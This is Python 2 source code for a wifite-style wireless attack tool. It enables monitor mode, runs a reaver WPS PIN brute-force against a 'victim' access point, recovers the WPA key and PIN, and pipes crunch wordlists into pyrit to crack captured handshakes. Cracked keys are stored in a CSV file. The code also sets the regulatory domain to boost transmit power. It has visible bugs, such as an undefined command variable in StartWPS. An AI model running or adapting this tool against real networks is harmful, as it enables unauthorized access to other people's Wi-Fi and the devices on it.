#!/usr/bin/python

#############
# COLORS #
#############
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
###############
import wtm_settings, os, sys, time , csv
# Executing, communicating with, killing processes
from sys import stdout  # Flushing
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM
# /dev/null, send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')
ERRLOG = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')


class RunConfiguration:
    def __init__(self):
        self.WIRELESS_IFACE=''
        self.IFACE_TO_TAKE_DOWN =''
        self.TX_POWER =''
        self.WIRELESS_IFACE = '' 
        self.PRINTED_SCANNING = False
        self.TX_POWER = 0 
        self.temp = '/tmp/wtm' 
        self.WPS_DISABLE = False  # Flag to skip WPS scan and attacks
        self.PIXIE = False
        self.WPS_FINDINGS = []  # List of (successful) results of WPS attacks
        self.WPS_TIMEOUT = 660  # Time to wait (in seconds) for successful PIN attempt
        self.WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)
        self.WPS_MAX_RETRIES = 0  # Number of times to re-try the same pin before giving up completely.
        self.WPA_FINDINGS = []  # List of strings containing info on successful WPA attacks    

        self.CRACKED_TARGETS = []  # List of targets we have already cracked
        self.CRACKED_TARGETS = self.load_cracked()

    def load_cracked(self):
        """
            Loads info about cracked access points into list, returns list.
        """
        result = []
        if not os.path.exists('cracked.csv'): return result
        with open('cracked.csv', 'rb') as csvfile:
            targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
            for row in targetreader:
                t = Target(row[0], 0, 0, 0, row[1], row[2])
                t.key = row[3]
                t.wps = row[4]
                result.append(t)
        return result



    def save_cracked(self, target):
        """
            Saves cracked access point key and info to a file.
        """
        self.CRACKED_TARGETS.append(target)
        with open('cracked.csv', 'wb') as csvfile:
            targetwriter = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            for target in self.CRACKED_TARGETS:
                targetwriter.writerow([target.bssid, target.encryption, target.ssid, target.key, target.wps])


    def exit_gracefully(self, code=0):

        self.RUN_ENGINE.disable_monitor_mode()
        print GR + " [+]" + W + " quitting"  # wifite will now exit"
        print ''
 
        print (GR + ' ['+ G +'B'+ GR +']' + B +"  Back "+ G +"OK!")
        print (GR + ' ['+ G +'E'+ GR +']' + B +"  Exit "+ G +"OK!")

        #return
        #exit(code)
        import wtm_main
        choice = raw_input(" >>  ")       
        wtm_main.exec_menu(choice)
        #return
        #exit(code)

class Target:
    """
        Holds data for a Target (aka Access Point aka Router)
    """

    def __init__(self, bssid, power, data, channel, encryption, ssid):
        self.bssid = bssid
        self.power = power
        self.data = data
        self.channel = channel
        self.encryption = encryption
        self.ssid = ssid
        self.wps = False  # Default to non-WPS-enabled router.
        self.key = ''

    

class RunEngine:
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config
        self.RUN_CONFIG.RUN_ENGINE = self
        self.bssid = wtm_settings.myglobalistbssid[0]
        self.essid = wtm_settings.myglobalistessid[0]
        self.chan = wtm_settings.myglobalistchan[0]
        self.encrypt = wtm_settings.myglobalistencrypt[0]
        self.wps = wtm_settings.myglobalistwps[0]
        self.iface = wtm_settings.myglobalistiface[0]
        self.clients = wtm_settings.myglobalistclients
        self.rutacap = wtm_settings.myglobalistrutacap[0]
        self.filename = wtm_settings.myglobalistfilename[0]
        self.cap = self.rutacap + self.filename



    def enable_monitor_mode(self, iface):
 
        #mac_anonymize(iface)
        print GR + ' [+]' + W + ' enabling monitor mode on %s...' % (G + iface + W),
        stdout.flush()
        call(['airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
        print 'done'
        self.RUN_CONFIG.WIRELESS_IFACE = ''  # remove this reference as we've started its monitoring counterpart
        self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()
        if self.RUN_CONFIG.TX_POWER > 0:
            print GR + ' [+]' + W + ' setting Tx power to %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W),
            call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
            call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
            print 'done'
        return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

    def disable_monitor_mode(self):
 
        if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '': return
        print GR + ' [+]' + W + ' disabling monitor mode on %s...' % (G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W),
        stdout.flush()
        call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
        print 'done'

    def rtl8187_fix(self):
 
        # Check if current interface is using the RTL8187 chipset
        proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        proc_airmon.wait()
        using_rtl8187 = False
        for line in proc_airmon.communicate()[0].split():
            line = line.upper()
            if line.strip() == '' or line.startswith('INTERFACE'): continue
            if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True

        if not using_rtl8187:
            # Display error message and exit
            print R + ' [!]' + O + ' unable to generate airodump-ng CSV file' + W
            print R + ' [!]' + O + ' you may want to disconnect/reconnect your wifi device' + W
            self.RUN_CONFIG.exit_gracefully(1)

        print O + " [!]" + W + " attempting " + O + "RTL8187 'Unknown Error 132'" + W + " fix..."

        original_iface = iface
        # Take device out of monitor mode
        airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=DN)
        airmon.wait()
        for line in airmon.communicate()[0].split('\n'):
            if line.strip() == '' or \
                    line.startswith("Interface") or \
                            line.find('(removed)') != -1:
                continue
            original_iface = line.split()[0]  # line[:line.find('\t')]

        # Remove drive modules, block/unblock ifaces, probe new modules.
        print_and_exec(['ifconfig', original_iface, 'down'])
        print_and_exec(['rmmod', 'rtl8187'])
        print_and_exec(['rfkill', 'block', 'all'])
        print_and_exec(['rfkill', 'unblock', 'all'])
        print_and_exec(['modprobe', 'rtl8187'])
        print_and_exec(['ifconfig', original_iface, 'up'])
        print_and_exec(['airmon-ng', 'start', original_iface])

        print '\r                                                        \r',
        print O + ' [!] ' + W + 'restarting scan...\n'

        return True

    def get_iface(self):
 
        if not self.RUN_CONFIG.PRINTED_SCANNING:
            print GR + ' [+]' + W + ' Attack Wps ...'
            self.RUN_CONFIG.PRINTED_SCANNING = True

        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
        iface = ''
        monitors = []
        adapters = []
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0: continue
            if ord(line[0]) != 32:  # Doesn't start with space
                iface = line[:line.find(' ')]  # is the interface
            if line.find('Mode:Monitor') != -1:
                if iface not in monitors:
                    #print GR + ' [+] found monitor inferface: ' + iface
                    monitors.append(iface)
            else:
                if iface not in adapters:
                    #print GR + ' [+] found wireless inferface: ' + iface
                    adapters.append(iface)

        if self.RUN_CONFIG.WIRELESS_IFACE != '':
            if monitors.count(self.RUN_CONFIG.WIRELESS_IFACE):
                return self.RUN_CONFIG.WIRELESS_IFACE
            else:
                if self.RUN_CONFIG.WIRELESS_IFACE in adapters:
                    # valid adapter, enable monitor mode
                    print R + ' [!]' + O + ' could not find wireless interface %s in monitor mode' % (
                    R + '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + '"' + O)
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                else:
                    # couldnt find the requested adapter
                    print R + ' [!]' + O + ' could not find wireless interface %s' % (
                    '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + O + '"' + W)
                    self.RUN_CONFIG.exit_gracefully(0)

        if len(monitors) == 1:
            return monitors[0]  # Default to only device in monitor mode
        elif len(monitors) > 1:
            print GR + " [+]" + W + " interfaces in " + G + "monitor mode:" + W
            for i, monitor in enumerate(monitors):
                print "  %s. %s" % (G + str(i + 1) + W, G + monitor + W)
            ri = raw_input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
                           (GR, W, G, W, G, len(monitors), W, G))
            while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
                ri = raw_input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
                               (GR, W, G, len(monitors), W, G))
            i = int(ri)
            return monitors[i - 1]

        proc = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0 or line.startswith('Interface') or line.startswith('PHY'): continue
            if line.startswith('phy'): line = line.split('\t', 1)[1]
            monitors.append(line)

        if len(monitors) == 0:
            print R + ' [!]' + O + " no wireless interfaces were found." + W
            print R + ' [!]' + O + " you need to plug in a wifi device or install drivers.\n" + W
            self.RUN_CONFIG.exit_gracefully(0)
        elif self.RUN_CONFIG.WIRELESS_IFACE != '' and monitors.count(self.RUN_CONFIG.WIRELESS_IFACE) > 0:
            monitor = monitors[0][:monitors[0].find('\t')]
            return self.enable_monitor_mode(monitor)
        elif len(monitors) == 1:
            monitor = monitors[0][:monitors[0].find('\t')]
            if monitor.startswith('phy'): monitor = monitors[0].split()[1]
            return self.enable_monitor_mode(monitor)

        print GR + " [+]" + W + " available wireless devices:"
        for i, monitor in enumerate(monitors):
            print "  %s%d%s. %s" % (G, i + 1, W, monitor)

        ri = raw_input(
            GR + " [+]" + W + " select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
            ri = raw_input(" [+] select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        i = int(ri)
        monitor = monitors[i - 1][:monitors[i - 1].find('\t')]

        return self.enable_monitor_mode(monitor)




    def attack_wps(self, pin):

        def attack_interrupted_prompt():
            self.RUN_CONFIG.exit_gracefully(1)  


        def sec_to_hms(sec):
     
            if sec <= -1: return '[endless]'
            h = sec / 3600
            sec %= 3600
            m = sec / 60
            sec %= 60
            return '[%d:%02d:%02d]' % (h, m, sec)

        
        def send_interrupt(process):
 
            try:
                os.kill(process.pid, SIGINT)
                # os.kill(process.pid, SIGTERM)
            except OSError:
                pass  # process cannot be killed
            except TypeError:
                pass  # pid is incorrect type
            except UnboundLocalError:
                pass  # 'process' is not defined
            except AttributeError:
                pass  # Trying to kill "None"


        print GR + ' [0:00:00]' + W + ' initializing %sWPS PIN attack%s on %s' % \
                                      (G, W, G + self.essid + W + ' (' + G + self.bssid + W + ')' + W)

        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.bssid,
               '-o', self.RUN_CONFIG.temp + 'out.out',  # Dump output to file to be monitored
               '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
               '-c', self.chan,
               # '--ignore-locks',
               '-vv', '-p', pin]  # verbose output
        proc = Popen(cmd, stdout=DN, stderr=DN)

        cracked = False  # Flag for when password/pin is found
        percent = 'x.xx%'  # Percentage complete
        aps = 'x'  # Seconds per attempt
        time_started = time.time()
        last_success = time_started  # Time of last successful attempt
        last_pin = ''  # Keep track of last pin tried (to detect retries)
        retries = 0  # Number of times we have attempted this PIN
        tries_total = 0  # Number of times we have attempted all pins
        tries = 0  # Number of successful attempts
        pin = ''
        key = ''

        try:
            while not cracked:
                time.sleep(1)

                if proc.poll() != None:
                    # Process stopped: Cracked? Failed?
                    inf = open(self.RUN_CONFIG.temp + 'out.out', 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        # When it's cracked:
                        if line.find("WPS PIN: '") != -1:
                            pin = line[line.find("WPS PIN: '") + 10:-1]
                        if line.find("WPA PSK: '") != -1:
                            key = line[line.find("WPA PSK: '") + 10:-1]
                            cracked = True

                    break

                if not os.path.exists(self.RUN_CONFIG.temp + 'out.out'): continue

                inf = open(self.RUN_CONFIG.temp + 'out.out', 'r')
                lines = inf.read().split('\n')
                inf.close()

                for line in lines:
                    if line.strip() == '': continue
                    # Status
                    if line.find(' complete @ ') != -1 and len(line) > 8:
                        percent = line.split(' ')[1]
                        i = line.find(' (')
                        j = line.find(' seconds/', i)
                        if i != -1 and j != -1: aps = line[i + 2:j]
                    # PIN attempt
                    elif line.find(' Trying pin ') != -1:
                        pin = line.strip().split(' ')[-1]
                        if pin == last_pin:
                            retries += 1
                        elif tries_total == 0:
                            last_pin = pin
                            tries_total -= 1
                        else:
                            last_success = time.time()
                            tries += 1
                            last_pin = pin
                            retries = 0
                        tries_total += 1

                    # Warning
                    elif line.endswith('10 failed connections in a row'):
                        pass

                    # Check for PIN/PSK
                    elif line.find("WPS PIN: '") != -1:
                        pin = line[line.find("WPS PIN: '") + 10:-1]
                    elif line.find("WPA PSK: '") != -1:
                        key = line[line.find("WPA PSK: '") + 10:-1]
                        cracked = True
                    if cracked: break

                print ' %s WPS attack, %s success/ttl,' % \
                      (GR + sec_to_hms(time.time() - time_started) + W, \
                       G + str(tries) + W + '/' + O + str(tries_total) + W),

                if percent == 'x.xx%' and aps == 'x':
                    print '\r',
                else:
                    print '%s complete (%s sec/att)   \r' % (G + percent + W, G + aps + W),

                if self.RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > self.RUN_CONFIG.WPS_TIMEOUT:
                    print R + '\n [!]' + O + ' unable to complete successful try in %d seconds' % (
                    self.RUN_CONFIG.WPS_TIMEOUT)
                    print R + ' [+]' + W + ' skipping %s' % (O + self.essid + W)
                    break

                if self.RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > self.RUN_CONFIG.WPS_MAX_RETRIES:
                    print R + '\n [!]' + O + ' unable to complete successful try in %d retries' % (
                    self.RUN_CONFIG.WPS_MAX_RETRIES)
                    print R + ' [+]' + O + ' the access point may have WPS-locking enabled, or is too far away' + W
                    print R + ' [+]' + W + ' skipping %s' % (O + self.essid + W)
                    break

                if self.RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (
                    float(tries) / tries_total) < self.RUN_CONFIG.WPS_RATIO_THRESHOLD:
                    print R + '\n [!]' + O + ' successful/total attempts ratio was too low (< %.2f)' % (
                    self.RUN_CONFIG.WPS_RATIO_THRESHOLD)
                    print R + ' [+]' + W + ' skipping %s' % (G + self.essid + W)
                    break

                stdout.flush()
                # Clear out output file if bigger than 1mb
                inf = open(self.RUN_CONFIG.temp + 'out.out', 'w')
                inf.close()

            # End of big "while not cracked" loop

            if cracked:
                if pin != '': print GR + '\n\n [+]' + G + ' PIN found:     %s' % (C + pin + W)
                if key != '': print GR + ' [+] %sWPA key found:%s %s' % (G, W, C + key + W)
                self.RUN_CONFIG.WPA_FINDINGS.append(W + "found %s's WPA key: \"%s\", WPS PIN: %s" % (
                G + self.essid + W, C + key + W, C + pin + W))
                self.RUN_CONFIG.WPA_FINDINGS.append('')

                t = Target(self.bssid, 0, 0, 0, 'WPA', self.essid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)

        except KeyboardInterrupt:
            print R + '\n (^C)' + O + ' WPS brute-force attack interrupted' + W
            if attack_interrupted_prompt():
                send_interrupt(proc)
                print ''
                self.RUN_CONFIG.exit_gracefully(0)

        send_interrupt(proc)

        return cracked


 
    def StartWPS(self):
        print (GR + 'WPS ATTACK'+ G +' ON ' +GR +' ...   Victim Bssid ' + G + self.bssid + GR)
        time_started = time.time()
 
        lowbssid = self.bssid[:8]
        for line in open("patts.csv"):
            if lowbssid in line:
                pines = line.split(',')[4].lower().split(' ')
                if self.filename == '':                           
                    for pin in pines:
                        print (GR +'\n')
                         
                        print (G + '[+]' + cmd + GR + '\n')
                        os.system(cmd)
                        
                       
                        timelost = round(time.time() - time_started)
                        print (G + '[+]' + str(timelost) + GR + ' seg \n' + GR)
        self.RUN_CONFIG.exit_gracefully(1)
                            
                           


    def StartWPA(self):
        print (GR + 'WPA ATTACK'+ G +' ON ' +GR +' ...   Victim Bssid ' + G + self.bssid + GR)
        time_started = time.time()
        lowbssid = self.bssid[:8]
        for line in open("patts.csv"):
            if lowbssid in line:                 
                if self.filename != '':
                    attack_crunch = line.split(',')[7].replace('\n','')
                    cmd = "crunch "+str(attack_crunch)+" | pyrit -r "+str(self.cap)+" -e "+str(self.essid)+" -b "+str(self.bssid)+" --all-handshakes --aes -i - attack_passthrough"
                    print (G + '[+]' + cmd + GR + '\n')
                    os.system(cmd)
                    timelost = round(time.time() - time_started)
                    print (G + '[+]' + str(timelost) + GR + ' seg \n' + GR)






